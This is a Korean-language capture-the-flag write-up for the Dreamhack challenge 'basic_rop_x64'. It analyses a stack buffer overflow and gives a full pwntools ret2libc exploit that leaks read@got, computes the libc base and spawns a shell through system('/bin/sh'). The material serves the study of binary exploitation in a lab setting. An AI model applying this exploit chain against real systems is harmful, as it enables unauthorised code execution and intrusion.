# ☘️ basic_rop_x64    
**Return Oriented Programming: 이미 존재하는 코드 조각(gadget)을 이어 붙여 원하는 실행 흐름을 만드는 기법**    
이 문제에서는 `system` 함수를 직접 호출하지 않고, 먼저 libc 주소를 leak한 뒤 그 주소를 기준으로 `system`과 `"/bin/sh"`의 실제 주소를 계산하여 ret2libc 방식으로 쉘을 획득한다.   

## 📄 Code Analysis
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```
`buf`의 크기는 `0x40`byte이지만 `read()` 함수는 최대 `0x400`byte를 입력받기 때문에 stack buffer overflow가 발생한다.   
또한 입력 직후 `write(1, buf, sizeof(buf))`를 수행하므로, 프로그램은 입력한 데이터 중 앞의 `0x40`바이트만 다시 출력한다. 이 특성을 이용해 1차 payload 전송 뒤 출력되는 `A * 0x40`을 먼저 정리하고, 그 다음에 이어지는 libc leak 값을 받을 수 있다.   

**checksec으로 보호 기법 확인**
```bash
$ checksec basic_rop_x64
```
이 문제는 exploit 흐름상 Stack Canary 없이, NX가 적용된 환경에서 ROP/ret2libc로 접근한다.   
또한 바이너리 내부 gadget 주소를 고정값으로 사용하는 것으로 보아 PIE는 꺼져 있는 환경이며, libc는 ASLR의 영향을 받아 실행할 때마다 주소가 바뀌므로 libc leak이 필요하다.   

## 🗡️ Exploit   
**1. Offset 계산**
```python
from pwn import *

# 원격 서버 연결
p = remote("host8.dreamhack.games", 23707)

# 바이너리 / libc 정보 읽기
e = ELF("./basic_rop_x64")
libc = ELF("./libc.so.6")

# offset = buf(0x40) + saved rbp(0x8)
payload = b'A' * 0x40
payload += b'B' * 8
```
이 문제에는 canary가 없으므로 `buf(0x40)` 뒤에 `saved rbp(0x8)`까지 채우면 바로 return address를 덮을 수 있다.   
따라서 기본 offset은 `0x40 + 0x8 = 0x48`이다.   

**2. ROP gadget과 PLT / GOT 주소 확인**
1) 개념 정리
- PLT: 외부 함수의 실제 주소로 가기 위한 점프 코드
- GOT: 외부 함수의 실제 주소가 저장되는 영역
- libc: `read`, `write`, `system` 같은 함수의 실제 구현이 들어 있는 공유 라이브러리
- system: 문자열을 받아 리눅스 명령처럼 실행하는 libc 함수, `system("/bin/sh")`

이 문제에서는 `write@plt`를 이용해 `read@got`에 저장된 실제 `read` 주소를 출력하고, 그 값을 기반으로 libc base를 구한 뒤 `system`과 `"/bin/sh"`의 실제 주소를 계산한다.   

2) ROPgadget을 이용해 필요한 gadget 주소를 확인
```bash
ROPgadget --binary ./basic_rop_x64 | grep "pop rdi"
ROPgadget --binary ./basic_rop_x64 | grep "pop rsi"
```

3) exploit에 사용할 주요 주소 설정
```python
# ROP gadget
pop_rdi = 0x0000000000400883
pop_rsi = 0x0000000000400881   # pop rsi ; pop r15 ; ret

# PLT / GOT / main 주소
read_plt = e.plt["read"]
read_got = e.got["read"]
write_plt = e.plt["write"]
write_got = e.got["write"]
main = e.symbols["main"]

# libc 안에서의 offset
read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
binsh_offset = next(libc.search(b"/bin/sh"))
```
여기서 `pop rsi` gadget은 `pop rsi ; pop r15 ; ret` 형태이므로 값을 두 개 넣어야 한다.   
즉 첫 번째 값은 `rsi`로 들어가고, 두 번째 값은 `r15`로 소비된다.   

**3. read 주소 leak**
```python
# rdi = 1 (stdout)
payload += p64(pop_rdi)
payload += p64(1)

# rsi = read_got
# 이 가젯은 pop rsi ; pop r15 ; ret 이라서 값 2개가 필요하다.
payload += p64(pop_rsi)
payload += p64(read_got)
payload += p64(8)

# write 호출
payload += p64(write_plt)

# leak 후 다시 main으로 돌아가서 두 번째 payload 입력받기
payload += p64(main)

p.send(payload)
```
이 payload의 목표는 `write(1, read_got, ...)`를 호출하여 `read@got` 안에 저장된 실제 `read` 주소를 출력하는 것이다.   
`rdi = 1`로 설정하여 stdout으로 출력하고, `rsi = read_got`으로 설정하여 `read@got`이 가리키는 내용을 출력하게 만든다.   
그 후 `main`으로 다시 돌아가 두 번째 payload를 입력할 기회를 얻는다.   

이 문제에서 중요한 점은 `write()`가 세 번째 인자 길이값으로 `rdx`를 필요로 하지만, 별도의 `pop rdx` gadget 없이도 exploit이 동작한다는 것이다.   
이는 직전에 호출된 `read(0, buf, 0x400)`의 영향으로 `rdx`에 충분히 큰 값이 남아 있어 leak이 가능하기 때문이다.   

**4. libc base와 실제 주소 계산**
```python
# 원래 프로그램이 buf 앞 0x40 바이트를 먼저 출력하므로
# 우리가 넣은 A 64개를 먼저 받아서 버린다.
p.recvuntil(b'A' * 0x40)

# 그 다음 나오는 leak된 read 주소를 받는다.
# 보통 상위 2바이트는 0x0000이라 6바이트만 받고 뒤에 붙여서 복원
read = u64(p.recvn(6) + b'\x00\x00')

# libc base 계산
libc_base = read - read_offset

# 실제 system, "/bin/sh" 주소 계산
system = libc_base + system_offset
binsh = libc_base + binsh_offset
```
`write(1, buf, sizeof(buf))` 때문에 앞의 `0x40`바이트가 먼저 출력되므로, 먼저 `A * 0x40`을 받아 정리한 뒤 그 다음에 이어지는 실제 leak 값을 읽어야 한다.   
이렇게 leak한 `read` 주소에서 libc 내부 `read` offset을 빼면 libc base를 구할 수 있고, 그 base에 `system` offset과 `"/bin/sh"` offset을 더해 실제 주소를 계산할 수 있다.   

**5. Final ROP payload 구성**
```python
exploit = b"A" * 0x40
exploit += b'B' * 8

# rdi에 "/bin/sh" 주소 넣기
exploit += p64(pop_rdi)
exploit += p64(binsh)

# system("/bin/sh") 호출
exploit += p64(system)

p.send(exploit)

# 두 번째 입력도 앞의 0x40 바이트가 먼저 출력되므로 그 부분 정리
p.recvuntil(b"A" * 0x40)

# 쉘 획득 후 상호작용
p.interactive()
```
두 번째 payload에서는 `rdi`에 `"/bin/sh"` 문자열의 실제 주소를 넣고, 이어서 `system`의 실제 주소로 점프한다.   
그 결과 최종적으로 `system("/bin/sh")`가 실행되어 쉘을 획득할 수 있다.   

## ✅ Conclusion
이 문제는 `read()`의 길이 검증 부재로 인해 발생하는 stack buffer overflow를 이용하는 문제이다.   
Stack Canary 없이 return address까지 덮어쓸 수 있으므로, 먼저 ROP를 이용해 `read@got`에 저장된 실제 `read` 주소를 leak한다.   
이후 leak한 주소로 libc base를 계산하고, 그 값을 바탕으로 `system` 함수와 `"/bin/sh"` 문자열의 실제 주소를 구한다.   
마지막으로 `pop rdi ; ret` gadget을 이용해 `rdi`에 `"/bin/sh"` 주소를 넣은 뒤 `system()`을 호출함으로써 쉘을 획득할 수 있다.   
즉 이 문제의 핵심은 **libc leak → libc base 계산 → ret2libc 기반 ROP 실행** 흐름을 정확히 구성하는 것이다.   

## ✅ Key Points
1) Stack Buffer Overflow  
`buf`의 크기는 `0x40`인데 `read()`는 `0x400`바이트를 입력받기 때문에 buf 뒤의 stack 데이터까지 덮어쓸 수 있다.

2) Offset Calculation  
canary가 없으므로 `buf(0x40) + saved rbp(0x8)`를 채운 뒤 바로 return address를 조작할 수 있다.

3) PLT / GOT  
`write@plt`를 이용해 `read@got`에 저장된 실제 `read` 주소를 출력하고, 이를 통해 libc 주소를 leak한다.

4) libc Base Calculation  
leak한 `read` 주소에서 libc 내부의 `read` offset을 빼서 libc base를 구한다.

5) ret2libc  
구한 libc base를 기준으로 `system`과 `"/bin/sh"`의 실제 주소를 계산하고, 이를 이용해 `system("/bin/sh")`를 실행한다.

6) ROP Gadget  
`pop rdi ; ret` gadget으로 `system()`의 첫 번째 인자인 `"/bin/sh"` 주소를 `rdi`에 넣고, `pop rsi ; pop r15 ; ret` gadget으로 1차 leak stage의 인자를 맞춘다.

7) Calling Convention  
amd64 환경에서는 함수 인자가 `rdi`, `rsi`, `rdx` 순서로 전달된다. 이 문제에서는 `write(1, read_got, size)` 형태를 만들기 위해 `rdi`와 `rsi`를 gadget으로 맞추고, `rdx`는 기존 레지스터 값이 유지되는 점을 활용했다.
